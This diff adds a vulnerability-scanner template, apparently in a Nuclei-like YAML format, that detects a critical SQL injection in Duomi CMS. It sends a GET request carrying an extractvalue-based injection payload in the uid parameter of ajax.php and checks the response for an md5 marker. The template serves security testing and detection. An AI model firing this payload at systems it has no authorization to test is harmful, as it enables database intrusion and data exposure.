@@ -1,0 +1,24 @@
+id: duomicms-sql-injection
+brief:
+    title: Duomi CMS - SQL Injection
+    by: pikpikcu
+    level: critical
+    about: Duomi CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the conte...
+    label:
+        - duomicms
+        - sqli
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))'
+      signs:
+        - "on": word
+          has:
+            - '{{md5({{num}})}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
